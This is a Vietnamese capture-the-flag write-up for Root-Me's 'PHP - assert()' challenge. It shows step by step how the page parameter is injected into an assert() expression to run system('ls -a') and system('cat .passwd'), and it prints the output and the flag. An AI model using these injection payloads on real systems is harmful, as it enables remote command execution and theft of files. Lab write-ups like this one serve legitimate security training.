# [PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)

## Solutions

- Khi bấm vào nút home thì gửi request có url `/web-serveur/ch47/?page=home`
- Thay đổi thử query parameter:
  - `/web-serveur/ch47/?page=aaa`: kết quả => 'includes/aaa.php'File does not exist
  - `/web-serveur/ch47/?page=../index`: kết quả => Warning: assert(): Assertion "strpos('includes/../index.php', '..') === false" failed

- Có thể thấy trong file index.php có gọi hàm assert với $assertion là `a string containing an expression`, trong đó query parameter sẽ được đưa vào giữa string này.

- Thử command injection:
  - "strpos('includes/','a') === false and system('ls -a') or strpos('.php', '..') === false"
  - Kết quả:

    ```text
    .
    ..
    ._nginx.http-level.inc
    ._nginx.server-level.inc
    ._perms
    ._php53-fpm.pool.inc
    .git
    .passwd
    includes
    index.php
    'includes/','a') === false and system('ls -a') or strpos('.php'File does not exist
    ```

- Đã thấy file .passwd:
  - "strpos('includes/','a') === false and system('cat .passwd') or strpos('.php', '..') === false"
  - Kết quả:

    ```text
    The flag is / Le flag est :
    x4Ss3rT1nglSn0ts4f3A7A1Lx
    Remember to sanitize all user inp...
    ```

## References

- 4 8 15 16 23 42: <https://lostpedia.fandom.com/wiki/The_Numbers#:~:text=Josephus%20Flavius%20%5B10%5D%20was%20a%201st%20century%20Jewish%20historian.&text=The%20elements%20with%20the%20atomic,%2C%20vanadium%2C%20and%20molybdenum%20respectively>.

- assert(): <https://code.tutsplus.com/articles/how-to-use-assert-in-php--cms-39647>
